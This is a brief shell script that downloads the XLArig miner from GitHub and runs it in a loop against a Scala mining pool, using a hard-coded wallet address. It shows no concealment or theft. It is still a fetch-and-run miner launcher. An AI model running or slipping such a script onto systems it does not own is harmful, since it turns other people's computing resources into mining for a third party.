#!/bin/sh
 
COUNTER=40
until [  $COUNTER -lt 20 ]; do

sudo apt update
sudo apt install screen -y 
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
apt install -y unzip
unzip XLArig-v5.2.2-linux-x86_64.zip
./xlarig --donate-level 1 -o scala.herominers.com:10131 -u SvkJRYwYgTMfxk2YLaVgJHYTUAyiEhMxJY77qGKvkKL5VQwruK7YvT8i22MzfC1dWUKrMXXnWwUSohcLtzQ2KLwX2RQvYsKyu -p Fucek -t2 -a panthera -k

     echo COUNTER $COUNTER
     let COUNTER-=1
done
